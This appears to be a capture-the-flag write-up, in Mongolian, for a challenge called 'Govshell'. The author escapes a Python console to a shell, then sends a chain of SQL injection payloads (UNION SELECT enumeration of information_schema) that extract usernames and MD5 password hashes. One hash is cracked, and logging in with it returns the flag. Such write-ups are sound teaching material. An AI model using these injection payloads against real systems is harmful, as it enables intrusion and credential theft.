# Govshell
**Category:** Pwn, Web
**Points:** 1000
**Description:**

`ssh gov@218.100.84.106 -i [govshell.key](govshell.key)`

## Writeup
ssh-ээр орох үед python console угтаж байна лээ. Доорх командыг бичээд shell-рүү орно.

```python
import os
os.system("/bin/bash")
```

`/hz` нэртэй directory файх бөгөөд ороод үзвэл [/hz/index.html](index.html), [/hz/get_flag.py](get_flag.py) гэсэн 2 файл байв. Формыг бөглөөд илгээх хаяг нь `http://backend.government.local` гэсэн дотоод сүлжээний хаяг юм байна гэж ойлголоо.
shell-ээс гараад python console-руугаа оров. Дараах байдлаар request-үүдээ явуулж болохоор байлаа.

```python
import urllib
data = urllib.urlencode({"username": "", "password": ""})
r = urllib.urlopen("http://backend.government.local", data=data)
r.read()
```
Hint дээр sql injection ашиглаарай гэсэн байсан болохоор шууд injection хийж эхэлье.

username дээр `' OR '1' = '1` гэж явуулахад:
```
type: superuser нууц үг буруу
type: user нууц үг буруу
```

username дээр `' UNION ALL SELECT 1#`, `' UNION ALL SELECT 1, 2#`, `' UNION ALL SELECT 1, 2, 3#` гэж явуулаад сүүлийнх дээр алдаа заалгүй дараах хариу авлаа:
```
type: 2 нууц үг буруу
```
`type: ` гэдэг дээр хоёр дахь field-г хэвлэж байгаа юм байна.

username дээр `' UNION ALL SELECT 1, CONCAT(table_schema, '.', table_name),
3 FROM information_schema.tables WHERE '1' = '1` гэж явуулаад гарсан дараах
мөрийг олов:
```
type: secret.users нууц үг буруу
```

Энэ хүснэгтийн багануудын нэрийг олъё:
`' UNION ALL SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_schema = 'secret' AND table_name = 'users' ORDER BY 'ordinal_position`
```
type: username нууц үг буруу
type: password нууц үг буруу
type: type нууц үг буруу
```

Хэрэглэгчдийн нэрийг олъё: `' UNION ALL SELECT 1, username, 3 FROM secret.users WHERE '1' = '1`
```
type: bat нууц үг буруу
type: dorj нууц үг буруу
```

Харгалзах нууц үгүүдийг олъё: `' UNION ALL SELECT 1, password, 3 FROM secret.users WHERE '1' = '1`
```
type: c44a471bd78cc6c2fea32b9fe028d30a нууц үг буруу
type: eb35db8a8ec54b209f125570b8e4ee0e нууц үг буруу
```

online md5 тайлагч [сайтаас](https://hashkiller.co.uk/md5-decrypter.aspx) хайж үзвэл `c44a471bd78cc6c2fea32b9fe028d30a`-г тайлж чадаж байна.

Ингээд `username: bat, password: asdfghjkl` гэсэн утгыг бөглөж илгээснээр flag-г гаргаж авлаа:

```
type: superuser
hz{0abc6322dc2040da457d1cb6303d98a0}
```
